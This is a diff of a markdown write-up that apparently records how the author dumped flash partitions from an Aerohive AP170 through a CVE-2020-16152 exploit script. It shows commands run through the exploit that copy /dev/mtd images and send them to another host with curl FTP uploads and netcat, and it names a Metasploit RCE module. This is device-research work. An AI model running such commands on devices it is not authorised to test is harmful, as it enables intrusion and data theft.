@@ -46,18 +46,17 @@ extract and transfer each image.
 ./CVE-2020-16152.py AP170.internal 'curl -T /f/mtdx.bin ftp://ftphost.internal/mtdx.bin'
 ./CVE-2020-16152.py AP170.internal 'rm /f/mtdx.bin'
 ```
-writing mtd0 and mtd1 to `/f` resulted in corruption
+writing mtd0 and mtd1 to `/f` resulted in corruption, copying to `/tmp` worked for mtd1 but not mtd0 it is too big for `/tmp`.
 
 ```bash
-# worked for mtd1
+# copy mtd1 to /tmp
 ./CVE-2020-16152.py AP170.internal 'dd if=/dev/mtd1 of=/tmp/mtd1.bin' 
 ./CVE-2020-16152.py AP170.internal 'curl -T /tmp/mtd1.bin ftp://ftphost.internal/mtd1.bin'
 ./CVE-2020-16152.py AP170.internal 'rm /tmp/mtd1.bin'
 ```
 
-mtd0 is too big for `/tmp`
-
 ```bash
+# have to netcat it
 # Sender
 ./CVE-2020-16152.py AP170.internal 'nc ftphost.internal 1234 < /dev/mtd0'
 # Receiver 
@@ -70,7 +69,5 @@ nc -l 1234 > mtd0.bin
 [Busybox Commands](extracted_details/busybox.log)\
 [Root FS listing](extracted_details/root_fs.log)
 
-
-
-[^1]: Although dumping as ascii hex and converting back to binary is possible it is time consuming and prone to error.\
-[^2]: search aerohive; info exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce
+[^1]: Although dumping as ascii hex and converting back to binary is possible it is time consuming and prone to error.  
+[^2]: search aerohive; info exploit/unix/webapp/aerohive_netconfig_lfi_log_poison_rce  
